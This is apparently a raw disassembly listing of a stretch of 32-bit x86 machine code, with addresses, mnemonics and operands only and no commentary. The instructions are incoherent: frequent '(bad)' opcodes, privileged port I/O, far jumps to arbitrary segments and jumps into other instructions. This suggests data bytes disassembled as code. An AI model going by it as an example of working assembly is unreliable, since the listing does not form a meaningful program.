  4144a1:	xchg   DWORD PTR [ecx+0x7c26ddd9],edx
  4144a7:	mov    DWORD PTR [eax],ebp
  4144a9:	iret   
  4144aa:	mov    esi,0xb47fd01b
  4144af:	xchg   ebx,eax
  4144b0:	arpl   WORD PTR [edi],sp
  4144b2:	mov    ecx,0x2f918f27
  4144b7:	xchg   BYTE PTR [ecx-0x4b010ffd],al
  4144bd:	xchg   esp,eax
  4144be:	pushf  
  4144bf:	sub    al,0x3a
  4144c1:	xchg   edi,eax
  4144c2:	adc    edi,DWORD PTR [ecx]
  4144c4:	inc    ebp
  4144c5:	jge    0x4144a6
  4144c7:	mov    ah,0xba
  4144c9:	rcr    BYTE PTR [eax+0x3b],cl
  4144cc:	cli    
  4144cd:	test   eax,0x387c8f59
  4144d2:	xchg   edx,eax
  4144d3:	in     eax,dx
  4144d4:	cmp    BYTE PTR [esi+0x1d],ah
  4144d7:	xchg   esi,eax
  4144d8:	in     eax,0xc0
  4144da:	or     eax,DWORD PTR [ebp+esi*8-0x132986fb]
  4144e1:	mov    cs,WORD PTR ds:0x4155b741
  4144e7:	mov    eax,ds:0x3df9a81
  4144ec:	(bad)
  4144ef:	out    dx,eax
  4144f0:	rcl    BYTE PTR [ebp-0x35],1
  4144f3:	pusha  
  4144f4:	fs dec esi
  4144f6:	add    DWORD PTR [ecx-0x4be0c168],esi
  4144fc:	xchg   bh,ah
  4144fe:	jecxz  0x4144aa
  414500:	fcmovbe st,st(4)
  414502:	dec    edi
  414503:	repnz push edi
  414505:	mov    ds:0xc12a542b,eax
  41450a:	or     BYTE PTR [ebx+0x42],dl
  41450d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41450e:	les    edx,FWORD PTR [eax]
  414510:	sub    edi,esp
  414512:	push   0x36930865
  414517:	jl     0x414533
  414519:	icebp  
  41451a:	imul   ebx,edx,0xbf66f90d
  414520:	js     0x41456a
  414522:	sub    ecx,ecx
  414524:	xchg   ebp,eax
  414525:	in     al,dx
  414526:	idiv   eax
  414528:	out    0xfa,al
  41452a:	scas   eax,DWORD PTR es:[edi]
  41452b:	stc    
  41452c:	or     DWORD PTR [esi+ebx*1],ebp
  41452f:	aam    0xb
  414531:	mov    ah,dh
  414533:	cmp    BYTE PTR [ebp-0x30faa76b],al
  414539:	cld    
  41453a:	xchg   DWORD PTR [esi-0x16],ebp
  41453d:	mov    ch,dl
  41453f:	sbb    eax,ebp
  414541:	sbb    DWORD PTR [edi+0x25e60341],esp
  414547:	mov    BYTE PTR [edi+ecx*4+0x7d],al
  41454b:	inc    edi
  41454c:	jbe    0x4144d4
  41454e:	inc    ebx
  41454f:	bnd ret 0xb194
  414553:	cmc    
  414554:	dec    esp
  414555:	enter  0x1f49,0xce
  414559:	xchg   DWORD PTR [edx+0x7c],ecx
  41455c:	fadd   QWORD PTR [ebx-0x20]
  41455f:	mov    ch,0xb1
  414561:	jne    0x414509
  414563:	xor    ch,cl
  414565:	xor    al,0x67
  414567:	mov    ebp,0xb58293d1
  41456c:	cmp    al,BYTE PTR [ecx+eax*4]
  41456f:	stos   DWORD PTR es:[edi],eax
  414570:	test   DWORD PTR [ebp+0x41d7dda0],esi
  414576:	sar    esi,0x4
  414579:	std    
  41457a:	sub    al,BYTE PTR [ebx]
  41457c:	cs push ecx
  41457e:	xchg   ebp,eax
  41457f:	ins    BYTE PTR es:[edi],dx
  414580:	or     edi,DWORD PTR [ebp+esi*4+0x2d68b515]
  414587:	out    0xff,al
  414589:	mov    esp,0x5079a6ee
  41458e:	sub    ah,BYTE PTR [edi+0x2febfa61]
  414594:	ror    DWORD PTR [ebx],cl
  414596:	adc    DWORD PTR [eax-0x52],ebp
  414599:	je     0x41455e
  41459b:	mov    al,0xbc
  41459d:	inc    eax
  41459e:	cs call 0x8eb1d984
  4145a4:	ins    DWORD PTR es:[edi],dx
  4145a5:	or     BYTE PTR [esi],ah
  4145a7:	jecxz  0x414580
  4145a9:	push   cs
  4145aa:	(bad)  
  4145ab:	push   ebp
  4145ac:	sbb    esi,DWORD PTR [eax]
  4145ae:	dec    ebx
  4145af:	fs or  esi,edi
  4145b2:	test   BYTE PTR gs:[ecx],ah
  4145b5:	jbe    0x41458b
  4145b7:	ja     0x4145b9
  4145b9:	push   0x35
  4145bb:	xchg   ebp,eax
  4145bc:	push   esp
  4145bd:	in     al,dx
  4145be:	pop    edx
  4145bf:	cmp    al,0x47
  4145c1:	add    BYTE PTR [edi+0x11],bh
  4145c4:	mov    ebx,0x1724e5b0
  4145c9:	jg     0x414577
  4145cb:	aas    
  4145cc:	dec    DWORD PTR [ebp-0x7bc2af86]
  4145d2:	jnp    0x41455c
  4145d4:	xchg   BYTE PTR [eax],ch
  4145d6:	repz leave 
  4145d8:	adc    BYTE PTR [ebx+0x1a219f67],cl
  4145de:	push   esi
  4145df:	adc    BYTE PTR ds:0xfaf2bd56,ch
  4145e5:	call   0x8155:0x2017abdc
  4145ec:	mov    dl,0xf2
  4145ee:	adc    BYTE PTR [ebx-0xf709788],0x98
  4145f5:	shld   edi,eax,0x33
  4145f9:	imul   ebp,DWORD PTR [ebx-0x62],0x25a4c888
  414600:	das    
  414601:	dec    esp
  414602:	lea    edx,[edx]
  414604:	cs adc al,0x2d
  414607:	mov    ds:0x45e56f65,eax
  41460c:	cmp    al,0xcd
  41460e:	sbb    eax,0x24be2abf
  414613:	es pop ebp
  414615:	cwde   
  414616:	popa   
  414617:	xlat   BYTE PTR ds:[ebx]
  414618:	cmp    DWORD PTR [ebp-0x4d4240cb],edi
  41461e:	mov    fs,edi
  414620:	mov    ds:0x6719a003,eax
  414625:	sbb    dl,BYTE PTR [ebx-0x3b64e1b4]
  41462b:	ins    DWORD PTR es:[edi],dx
  41462c:	mov    bl,0x3a
  41462e:	inc    ebx
  41462f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414630:	arpl   dx,di
  414632:	adc    al,BYTE PTR [esi+edx*4]
  414635:	in     eax,dx
  414636:	mov    edi,0xc62ccc8f
  41463b:	ret    
  41463c:	mov    BYTE PTR [edi-0x42786761],0xaf
  414643:	idiv   ecx
  414645:	(bad)  
  414646:	jb     0x4146b8
  414648:	adc    al,0xc9
  41464a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41464b:	push   cs
  41464c:	xchg   esp,eax
  41464d:	lahf   
  41464e:	mov    ecx,DWORD PTR [ebx+esi*4]
  414651:	jnp    0x4146b6
  414653:	xchg   esi,eax
  414654:	stos   BYTE PTR es:[edi],al
  414655:	fidivr DWORD PTR [esi-0x20846284]
  41465b:	call   0x9da95fde
  414660:	cmp    al,0xa8
  414662:	inc    esp
  414663:	test   al,0x3e
  414665:	mov    WORD PTR [esi],fs
  414667:	sub    DWORD PTR [ebp-0x4f5c2d6],0x18515486
  414671:	imul   ebx,ebp,0x71
  414674:	mov    ds:0xe79b7edf,al
  414679:	ror    DWORD PTR [ebx+0x6c0e6bb9],cl
  41467f:	xchg   ecx,eax
  414680:	push   esi
  414681:	pop    ss
  414682:	mov    edi,0x402989d2
  414687:	jae    0x41464e
  414689:	push   0x53495d2a
  41468e:	sbb    eax,0x21d84702
  414693:	clc    
  414694:	aaa    
  414695:	lahf   
  414696:	ret    0x2521
  414699:	in     eax,0xa9
  41469b:	out    0x67,eax
  41469d:	loope  0x414645
  41469f:	clc    
  4146a0:	retf   
  4146a1:	leave  
  4146a2:	jo     0x414681
  4146a4:	sub    DWORD PTR [ebx-0x4aee0707],esp
  4146aa:	mov    esp,DWORD PTR [edi+0x4b56b6a3]
  4146b0:	sub    DWORD PTR [ecx],edi
  4146b2:	pop    ds
  4146b3:	test   BYTE PTR [ecx+0x2c],bl
  4146b6:	(bad)  
  4146b7:	mov    dl,0xc3
  4146b9:	fs retf 
  4146bb:	clc    
  4146bc:	neg    BYTE PTR [ebx+eiz*1]
  4146bf:	call   0x6be7fc2e
  4146c4:	push   0x2d17ac24
  4146c9:	(bad)  
  4146ca:	sub    bh,bh
  4146cc:	and    eax,0xe2c4502b
  4146d1:	mov    ch,0x78
  4146d3:	lods   al,BYTE PTR ds:[esi]
  4146d4:	jne    0x4146ed
  4146d6:	push   cs
  4146d7:	in     eax,dx
  4146d8:	nop
  4146d9:	(bad)  [esi-0x54]
  4146dc:	imul   ebp,ecx,0x14
  4146df:	in     eax,0xb2
  4146e1:	pop    ebp
  4146e2:	test   eax,0xfe7f69a5
  4146e7:	into   
  4146e8:	(bad)  
  4146eb:	nop
  4146ec:	sbb    eax,0x399d9a6c
  4146f1:	mov    al,ds:0x4ccba445
  4146f6:	mov    dh,0xcb
  4146f8:	cs dec edx
  4146fa:	nop
  4146fb:	cs inc ebx
  4146fd:	sar    DWORD PTR [edx+0x77],0x9b
  414701:	sub    cl,0x98
  414704:	imul   edi
  414706:	jmp    0x414774
  414708:	ffree  st(0)
  41470a:	shl    BYTE PTR [ecx-0x4e546bba],cl
  414710:	cmp    BYTE PTR [edx-0x7a],bh
  414713:	(bad)  
  414714:	test   al,0x1e
  414716:	sbb    al,0xa6
  414718:	adc    cl,BYTE PTR [ebx-0x15690bf2]
  41471e:	and    bl,bl
  414720:	sub    al,0x9
  414722:	add    ah,BYTE PTR [edx+0x48]
  414725:	scas   al,BYTE PTR es:[edi]
  414726:	imul   eax,DWORD PTR ds:0x68c747fb,0x66628df
  414730:	dec    ebx
  414731:	fidivr DWORD PTR [edi+ebx*4+0x4c]
  414735:	pop    edi
  414736:	cmp    esp,DWORD PTR ds:0x2d040459
  41473c:	xchg   BYTE PTR [edx-0x39a11b30],bl
  414742:	dec    ebx
  414743:	xor    eax,0xe4e92be8
  414748:	push   eax
  414749:	loope  0x414708
  41474b:	aas    
  41474c:	sbb    BYTE PTR [edi+0x16c770ca],0x63
  414753:	cmp    dh,ch
  414755:	mov    esi,0xd8ae9792
  41475a:	add    DWORD PTR [ecx-0xf],ebx
  41475d:	jle    0x41479b
  41475f:	stc    
  414760:	add    edi,DWORD PTR [ecx+0x27cd8784]
  414766:	jmp    0xc4560d84
  41476b:	xor    eax,0xcbb4845b
  414770:	leave  
  414771:	or     edi,DWORD PTR [ecx-0x6f86dce7]
  414777:	popf   
  414778:	jg     0x41478c
  41477a:	popa   
  41477b:	mov    eax,0xab4f129a
  414780:	mov    dh,dh
  414782:	xchg   DWORD PTR [edi],esi
  414784:	adc    al,BYTE PTR [ebx+0x1015fc2]
  41478a:	test   al,0x72
  41478c:	scas   al,BYTE PTR es:[edi]
  41478d:	mov    ecx,0x8ceaaa8e
  414792:	add    eax,0xa7a1eff2
  414797:	mov    eax,0x7a750148
  41479c:	lahf   
  41479d:	neg    esi
  41479f:	(bad)
  4147a2:	imul   edx,ebp,0xaf89af1b
  4147a8:	fcomi  st,st(4)
  4147aa:	out    dx,al
  4147ab:	popa   
  4147ac:	lods   al,BYTE PTR ds:[esi]
  4147ad:	(bad)  
  4147ae:	and    DWORD PTR [esp+ebx*4-0x1f9ea363],esi
  4147b5:	fisubr DWORD PTR [ebx-0x412ded85]
  4147bb:	mov    eax,ds:0x878fc8f6
  4147c0:	cmp    dl,dl
  4147c2:	adc    eax,0x1fb306d6
  4147c7:	and    edx,DWORD PTR [ebp-0x3fba2f7]
  4147cd:	hlt    
  4147ce:	mov    bh,0xb
  4147d0:	das    
  4147d1:	stc    
  4147d2:	push   ecx
  4147d3:	dec    ebp
  4147d4:	pop    ebp
  4147d5:	mov    ebp,0xab68293e
  4147da:	push   ss
  4147db:	mov    eax,0xc2d2bd54
  4147e0:	aaa    
  4147e1:	push   0xfffffffd
  4147e3:	stos   BYTE PTR es:[edi],al
  4147e4:	jmp    0xa99f3328
  4147e9:	fs (bad) 
  4147eb:	je     0x41484f
  4147ed:	ds dec ebx
  4147ef:	nop
  4147f0:	xor    BYTE PTR [esi-0x54d9fe4b],0x6b
  4147f7:	add    DWORD PTR [edx+0x62],ebp
  4147fa:	aas    
  4147fb:	or     edx,edx
  4147fd:	lods   al,BYTE PTR ds:[esi]
  4147fe:	aaa    
  4147ff:	stc    
  414800:	ds jae 0x414807
  414803:	dec    ebp
  414804:	mov    bl,0x4f
  414806:	push   es
  414807:	in     al,0xa9
  414809:	jmp    0xe5e1:0xebcee6ff
  414810:	mov    ds:0x1486c83,eax
  414815:	xor    BYTE PTR [edx+0x30ab45da],bl
  41481b:	jb     0x4147d1
  41481d:	mov    ch,0x20
  41481f:	fisub  WORD PTR [eax+0x7f6f9151]
  414825:	pop    esp
  414826:	call   0xfd06:0x73285934
  41482d:	and    ah,BYTE PTR [esi-0x72136938]
  414833:	mov    ?,eax
  414835:	imul   edi,DWORD PTR [edx],0x2a
  414838:	repz add BYTE PTR ds:0x9ce116b4,bh
  41483f:	popa   
  414840:	and    DWORD PTR [eax+esi*4+0x46],ebx
  414844:	add    eax,0x4d6cf6b3
  414849:	xchg   esi,eax
  41484a:	xor    DWORD PTR [edi-0x2],esp
  41484d:	inc    esp
  41484e:	adc    ebp,ebx
  414850:	stos   DWORD PTR es:[edi],eax
  414851:	pushf  
  414852:	out    0x33,al
  414854:	sbb    BYTE PTR [ebx-0x41],ch
  414857:	mov    eax,0x349984e2
  41485c:	xchg   ecx,eax
  41485d:	jmp    0xd52b:0xc20fa12f
  414864:	xor    cl,BYTE PTR [edi+0x40]
  414867:	mov    ebp,DWORD PTR ds:0x35405842
  41486d:	mov    bh,0xb3
  41486f:	popf   
  414870:	mov    ebp,0x7f27aa82
  414875:	jle    0x414807
  414877:	(bad)  
  414878:	mov    edx,0x12db7439
  41487d:	ret    0xe4c6
  414880:	int    0xc9
  414882:	test   BYTE PTR [eax+0x6a],ah
  414885:	mov    al,0x21
  414887:	mov    cl,0x92
  414889:	adc    eax,DWORD PTR [edi+0xc]
  41488c:	sbb    DWORD PTR [eax+0x752732e],0x717d893d
  414896:	add    bh,BYTE PTR es:[edx]
  414899:	inc    edx
  41489a:	push   eax
  41489b:	xor    DWORD PTR [ebp-0x6c],ecx
  41489e:	fist   DWORD PTR [ebp-0x68]
  4148a1:	loopne 0x4148e8
  4148a3:	mov    ds:0xa5788084,eax
  4148a8:	not    cl
  4148aa:	cdq    
  4148ab:	mov    ds:0xfc4f8fd1,al
  4148b0:	xchg   cl,dl
  4148b2:	mov    WORD PTR [ebx-0x540ff596],ss
  4148b8:	sbb    al,0xa5
  4148ba:	sbb    ebx,eax
  4148bc:	outs   dx,BYTE PTR ds:[esi]
  4148bd:	jge    0x41486b
  4148bf:	adc    dh,dl
  4148c1:	inc    ebx
  4148c2:	inc    ebp
  4148c3:	add    al,0xb7
  4148c5:	or     DWORD PTR [ecx+0x7f6af705],ebp
  4148cb:	pop    esi
  4148cc:	fidivr WORD PTR [ebx+edi*8]
  4148cf:	add    DWORD PTR [eax+eiz*8+0x24],0xb4b8c171
  4148d7:	jmp    0x1fcb:0xbe9007f8
  4148de:	leave  
  4148df:	leave  
  4148e0:	ins    DWORD PTR es:[edi],dx
  4148e1:	jnp    0x4148ac
  4148e3:	push   esp
  4148e4:	in     al,0x30
  4148e6:	call   0xb6f56c34
  4148eb:	xor    al,0xc8
  4148ed:	(bad)  
  4148ee:	sbb    eax,0x69d2d408
  4148f3:	adc    eax,0xdca5ee64
  4148f8:	cld    
  4148f9:	in     al,0x3f
  4148fb:	push   edx
  4148fc:	adc    al,0x4f
  4148fe:	mov    dh,0xa9
  414900:	mov    ebx,0x5012dbf7
  414905:	clc    
  414906:	adc    al,0xc0
  414908:	xlat   BYTE PTR ds:[ebx]
  41490a:	pop    eax
  41490b:	mov    ch,0x9b
  41490d:	adc    ch,BYTE PTR [edx+0x77ff203f]
  414913:	das    
  414914:	rcl    DWORD PTR [esi-0x71],0xa1
  414918:	ins    DWORD PTR es:[edi],dx
  414919:	stc    
  41491a:	pop    eax
  41491b:	pusha  
  41491c:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41491e:	jmp    0x7638:0xbe8c1ee7
  414925:	je     0x4149a2
  414927:	shr    BYTE PTR [ebx-0x30],cl
  41492a:	fsub   QWORD PTR [ecx]
  41492c:	cli    
  41492d:	fcom   st(7)
  41492f:	push   esp
  414930:	inc    ebx
  414931:	in     al,dx
  414932:	xor    edi,0x374a9443
  414938:	nop
  414939:	out    0x16,al
  41493b:	cmp    esi,DWORD PTR cs:[eax]
  41493e:	lods   eax,DWORD PTR ds:[esi]
  41493f:	loope  0x414955
  414941:	mov    WORD PTR [edx+0x47],cs
  414944:	(bad)  
  414945:	fistp  DWORD PTR [edi]
  414947:	imul   edi,DWORD PTR [edx+0x2248d7f],0xffffffac
  41494e:	push   ds
  41494f:	xchg   DWORD PTR [ebx+0x3dac14db],esp
  414955:	popf   
  414956:	mov    eax,0x6a8419ef
  41495b:	mov    BYTE PTR [edi+ecx*4-0x40],0x5b
  414960:	pop    ecx
  414961:	js     0x41497b
  414963:	stos   BYTE PTR es:[edi],al
  414964:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414965:	call   0x55b15dd2
  41496a:	addr16 jmp 0x1127acc7
  414970:	test   dh,al
  414972:	call   DWORD PTR [edx]
  414974:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414975:	shr    DWORD PTR [edx],0xfe
  414978:	test   al,0x79
  41497a:	push   ss
  41497b:	js     0x414952
  41497d:	imul   DWORD PTR [edx]
  41497f:	fs xor al,0x5
  414982:	fist   WORD PTR [esi]
  414984:	shl    edi,cl
  414986:	add    ebx,eax
  414988:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41498a:	dec    edi
  41498b:	mov    bl,0x5c
  41498d:	xchg   edi,eax
  41498e:	lds    eax,FWORD PTR [eax]
  414990:	jbe    0x41496e
  414992:	push   ecx
  414993:	push   cs
  414994:	cwde   
  414995:	loop   0x4149a7
  414997:	or     ch,BYTE PTR [edx]
  414999:	push   ds
  41499a:	sub    edx,DWORD PTR [esi+0x29]
  41499d:	icebp  
  41499e:	jle    0x4149e6
  4149a0:	cdq    
  4149a1:	sub    DWORD PTR [ecx-0x5de703e],ebx
  4149a7:	jg     0x4149a6
  4149a9:	ss xchg esi,eax
  4149ab:	xlat   BYTE PTR ds:[ebx]
  4149ac:	ret    0xf6bb
  4149af:	jecxz  0x4149d4
  4149b1:	xchg   ebx,eax
  4149b2:	dec    eax
  4149b3:	dec    ecx
  4149b4:	stc    
  4149b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149b6:	rol    dh,1
  4149b8:	push   ds
  4149b9:	sub    bl,BYTE PTR [ecx-0x30]
  4149bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149bd:	imul   esi,DWORD PTR [edx],0x3e69a9aa
  4149c3:	or     bh,bl
  4149c5:	mov    bh,0xfb
  4149c7:	cmp    BYTE PTR [esi-0x2d3e452c],bl
  4149cd:	sub    al,0x27
  4149cf:	test   DWORD PTR [edx-0xb980722],ebp
  4149d5:	int    0x8b
  4149d7:	mov    ds:0x57123419,eax
  4149dc:	cmp    al,0x3
  4149de:	rcl    BYTE PTR [esi+0x55],cl
  4149e1:	popf   
  4149e2:	loop   0x4149e9
  4149e4:	xlat   BYTE PTR ds:[ebx]
  4149e5:	cli    
  4149e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149e7:	jecxz  0x4149a3
  4149e9:	aaa    
  4149ea:	pop    ss
  4149eb:	jg     0x4149c6
  4149ed:	adc    al,0x3
  4149ef:	loopne 0x4149a5
  4149f1:	dec    esi
  4149f2:	mov    dh,0x2e
  4149f4:	xor    eax,0xecd01eba
  4149f9:	mov    al,0x7b
  4149fb:	(bad)  
  4149fc:	ss out 0x36,al
  4149ff:	adc    DWORD PTR [ebp-0x33617d54],eax
  414a05:	dec    ebp
  414a06:	push   esp
  414a07:	push   ebx
  414a08:	(bad)  
  414a09:	out    dx,eax
  414a0a:	ja     0x4149d9
  414a0c:	daa    
  414a0d:	ret    0xe059
  414a10:	xchg   esi,eax
  414a11:	push   0xffffffdc
  414a13:	sbb    BYTE PTR [esi+0x48c04b8c],dl
  414a19:	fstp   TBYTE PTR [ebx+esi*8]
  414a1c:	cs repnz sbb esi,ebx
  414a20:	(bad)  
  414a21:	adc    BYTE PTR [ebp-0x5c],ah
  414a24:	clc    
  414a25:	mov    esi,0x7f916060
  414a2a:	or     DWORD PTR [edi+0x5ec3dd7e],edi
  414a30:	jb     0x4149bd
  414a32:	and    BYTE PTR [edx+0x12],dh
  414a35:	and    BYTE PTR [ecx+0xf],bh
  414a38:	push   ss
  414a39:	in     al,0xb5
  414a3b:	sbb    al,0x51
  414a3d:	loop   0x414aa9
  414a3f:	pop    edi
  414a41:	xor    eax,0x48f7f5b0
  414a46:	clc    
  414a47:	and    al,0x78
  414a49:	lahf   
  414a4a:	popa   
  414a4b:	fnstenv [edi-0x5a]
  414a4e:	lods   al,BYTE PTR ds:[esi]
  414a4f:	daa    
  414a50:	mov    DWORD PTR [ebp+ebx*1-0x147104f2],0x1182d920
  414a5b:	or     dh,BYTE PTR ds:0xda13ace0
  414a61:	adc    eax,0x8799dca7
  414a66:	xor    al,0x89
  414a68:	jecxz  0x414a4a
  414a6a:	pushf  
  414a6b:	sbb    bh,al
  414a6d:	adc    BYTE PTR [ebp+ebx*4+0x19],dh
  414a71:	xchg   edx,eax
  414a72:	mov    al,ds:0xe4558b0e
  414a77:	xor    eax,esi
  414a79:	jmp    0x416dee
  414a7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a7f:	xchg   esi,eax
  414a80:	retf   
  414a81:	dec    eax
  414a82:	mov    esp,edi
  414a84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a85:	xchg   esp,eax
  414a86:	dec    ecx
  414a87:	(bad)  
  414a88:	mov    ah,0x80
  414a8a:	mov    bl,0x36
  414a8c:	(bad)  
  414a8d:	jbe    0x414a7e
  414a8f:	inc    edi
  414a90:	popa   
  414a91:	bound  ecx,QWORD PTR [edx]
  414a93:	pop    edi
  414a94:	bound  esp,QWORD PTR [edx-0x67]
  414a97:	dec    edx
  414a98:	sbb    ah,BYTE PTR fs:[edx+0x17822304]
  414a9f:	mov    ecx,0x515d1ee1
  414aa4:	mov    esi,0x2bcaaabd
  414aa9:	mov    BYTE PTR [ebp+0x2b],cl
  414aac:	add    al,0x29
  414aae:	mov    al,0x5e
  414ab0:	scas   eax,DWORD PTR es:[edi]
  414ab1:	push   ecx
  414ab2:	pop    ds
  414ab3:	outs   dx,DWORD PTR ds:[esi]
  414ab4:	inc    ebp
  414ab5:	fdivr  DWORD PTR [esi+0x7c]
  414ab8:	dec    edx
  414ab9:	push   eax
  414aba:	int3   
  414abb:	mov    cl,0x26
  414abd:	aad    0xcd
  414abf:	pop    ds
  414ac0:	addr16 js 0x414ac0
  414ac3:	mov    esi,0x3770803f
  414ac8:	aas    
  414ac9:	outs   dx,BYTE PTR ds:[esi]
  414aca:	pop    edx
  414acb:	inc    ecx
  414acc:	out    dx,al
  414acd:	aad    0x41
  414acf:	(bad)  
  414ad0:	adc    BYTE PTR [ecx-0x33f00e2b],cl
  414ad6:	arpl   WORD PTR [edx+0x16],si
  414ad9:	push   ebp
  414ada:	je     0x414ae9
  414adc:	(bad)  
  414add:	addr16 inc ecx
  414adf:	mov    esp,0x158ba10b
  414ae4:	fstp   st(4)
  414ae6:	inc    eax
  414ae7:	jmp    0x2e16:0xb20d27fd
  414aee:	pop    edx
  414aef:	sbb    bh,BYTE PTR [ecx+0x32]
  414af2:	ja     0x414b6d
  414af4:	nop
  414af5:	push   edx
  414af6:	aas    
  414af7:	clc    
  414af8:	xchg   esp,eax
  414af9:	(bad)  
  414afa:	into   
  414afb:	fldcw  WORD PTR [ecx-0x1a9bf260]
  414b01:	or     bl,ah
  414b03:	leave  
  414b04:	imul   ecx,DWORD PTR [ebp+edi*1+0x50],0x2a6af935
  414b0c:	repnz stos BYTE PTR es:[edi],al
  414b0e:	xor    ebx,esi
  414b10:	ja     0x414b18
  414b12:	neg    DWORD PTR [eax-0x7378cf71]
  414b18:	ret    0xa767
  414b1b:	test   BYTE PTR [esi+esi*1-0x4d],0xe6
  414b20:	ret    
  414b21:	fdivp  st(1),st
  414b23:	pop    ebp
  414b24:	(bad)
  414b27:	adc    eax,0xce51e5ed
  414b2c:	scas   eax,DWORD PTR es:[edi]
  414b2d:	mov    bh,0x35
  414b2f:	(bad)  [eax+0x1c]
  414b32:	add    edi,DWORD PTR [edx+0x10]
  414b35:	mov    dh,0x65
  414b37:	and    DWORD PTR [edi-0x23fcdc90],esi
  414b3d:	out    dx,eax
  414b3e:	push   edi
  414b3f:	pusha  
  414b40:	inc    esp
  414b41:	lea    ebx,[esp+ecx*2+0x5091274f]
  414b48:	mov    dh,0xbc
  414b4a:	push   es
  414b4b:	xor    DWORD PTR [edx],ecx
  414b4d:	mov    eax,0xdb26447b
  414b52:	cmp    eax,0x10f3a16e
  414b57:	cld    
  414b58:	lds    esp,FWORD PTR [edi+0x5f]
  414b5b:	rcr    eax,1
  414b5d:	fld    TBYTE PTR [ecx]
  414b5f:	push   ecx
  414b60:	std    
  414b61:	imul   ebx,eax,0x7602691c
  414b67:	adc    al,BYTE PTR [esi]
  414b69:	xor    BYTE PTR [edi],0xad
  414b6c:	pushf  
  414b6d:	mov    DWORD PTR [ebp+eax*8-0x4e],ebp
  414b71:	fistp  WORD PTR [ecx+0x5a]
  414b74:	fcom   DWORD PTR [ebp-0x7b]
  414b77:	and    DWORD PTR [eax+eiz*1+0x26ae41d],eax
  414b7e:	dec    esp
  414b7f:	gs cmp eax,0x6026428d
  414b85:	shl    BYTE PTR [esi-0x75],0xdc
  414b89:	xchg   edx,eax
  414b8a:	ror    BYTE PTR [esi],0x14
  414b8d:	aaa    
  414b8e:	fsubr  DWORD PTR [esi-0x4]
  414b91:	and    ah,BYTE PTR [edx-0x221b4044]
  414b97:	shl    DWORD PTR [edi-0x372bdbd2],0x3b
  414b9e:	cwde   
  414b9f:	add    DWORD PTR [edx+0x1f],esp
  414ba2:	xor    cl,BYTE PTR [esp+ebx*4+0x0]
  414ba6:	addr16 push ebp
  414ba8:	inc    ebp
  414ba9:	mov    esp,0x806790c8
  414bae:	sub    eax,0x3af67b68
  414bb3:	add    al,0x19
  414bb5:	mov    edx,0x16f5aebc
  414bba:	jecxz  0x414b56
  414bbc:	mov    ah,0x1d
  414bbe:	cmp    BYTE PTR [ecx],0xf1
  414bc1:	cmp    eax,0xf1f11c13
  414bc6:	add    al,0xfe
  414bc8:	jns    0x414bac
  414bca:	inc    ecx
  414bcb:	ror    cl,cl
  414bcd:	scas   eax,DWORD PTR es:[edi]
  414bce:	mov    bl,BYTE PTR [edi+0x11]
  414bd1:	bound  esp,QWORD PTR [ebx]
  414bd3:	jp     0x414baa
  414bd5:	jp     0x414bb5
  414bd7:	in     eax,dx
  414bd8:	out    dx,eax
  414bd9:	cmp    eax,0xb2eb2cb2
  414bde:	lahf   
  414bdf:	(bad)  
  414be0:	mov    esp,0xc5ff8098
  414be5:	stc    
  414be6:	mov    al,ds:0xa4b5a1d3
  414beb:	inc    ebx
  414bec:	fisttp QWORD PTR [esi-0x64]
  414bef:	pop    edx
  414bf0:	pop    ebx
  414bf1:	or     DWORD PTR [edi+0x1cf6e310],eax
  414bf7:	loope  0x414c30
  414bf9:	xchg   esi,eax
  414bfa:	pop    eax
  414bfb:	imul   ecx,DWORD PTR [edi+0xc6ba07c],0xfffffff2
  414c02:	sbb    DWORD PTR [ecx-0x19],edx
  414c05:	in     eax,dx
  414c06:	stos   BYTE PTR es:[edi],al
  414c07:	and    edi,DWORD PTR ds:0x3df627c2
  414c0d:	bound  esi,QWORD PTR [edi-0x3]
  414c10:	push   eax
  414c11:	int    0xcb
  414c13:	sub    eax,0x8dc60394
  414c18:	xlat   BYTE PTR ds:[ebx]
  414c19:	(bad)  
  414c1a:	sbb    eax,0xd44fa897
  414c1f:	adc    ch,BYTE PTR [esi+0x1872b93b]
  414c25:	es shl bl,0x6a
  414c29:	or     BYTE PTR [edi-0x53],dl
  414c2c:	mov    BYTE PTR fs:[esi+0x1e51966d],al
  414c33:	out    0x89,al
  414c35:	push   edx
  414c36:	hlt    
  414c37:	jns    0x414bf7
  414c39:	dec    esi
  414c3a:	clc    
  414c3b:	loopne 0x414c46
  414c3d:	and    eax,DWORD PTR [edx-0x69da708d]
  414c43:	or     eax,0xbde3a609
  414c48:	jl     0x414c80
  414c4a:	mov    ebp,0xc322e994
  414c4f:	aad    0x3f
  414c51:	xlat   BYTE PTR ds:[ebx]
  414c52:	in     eax,0xb8
  414c54:	test   al,0x96
  414c56:	sub    BYTE PTR [esi-0x578d48a1],al
  414c5c:	mov    esi,DWORD PTR [ebx+0x3d7f173e]
  414c62:	and    ah,ah
  414c64:	adc    eax,edi
  414c66:	(bad)  
  414c67:	jmp    0x414cb3
  414c69:	jnp    0x414cbb
  414c6b:	add    bh,0xa4
  414c6e:	sub    eax,0xf426e840
  414c73:	mov    al,0xa4
  414c75:	test   al,0x38
  414c77:	add    eax,DWORD PTR [esi+edi*2+0xf87a20]
  414c7e:	loope  0x414c70
  414c80:	sub    DWORD PTR [esi],0xe4aaa70d
  414c86:	sub    edi,DWORD PTR [ebx+0x4f]
  414c89:	ficom  WORD PTR [ecx]
  414c8b:	fwait
  414c8c:	shl    edi,0x74
  414c8f:	fsubr  QWORD PTR [eax]
  414c91:	jecxz  0x414ccf
  414c93:	(bad)  
  414c94:	and    ebx,ebx
  414c96:	adc    BYTE PTR [edx-0x3a8d4fb0],0xf8
  414c9d:	inc    ecx
  414c9e:	jmp    FWORD PTR [ebp-0x58]
  414ca1:	adc    ah,ch
  414ca3:	dec    esi
  414ca4:	xor    ebp,ebx
  414ca6:	push   edi
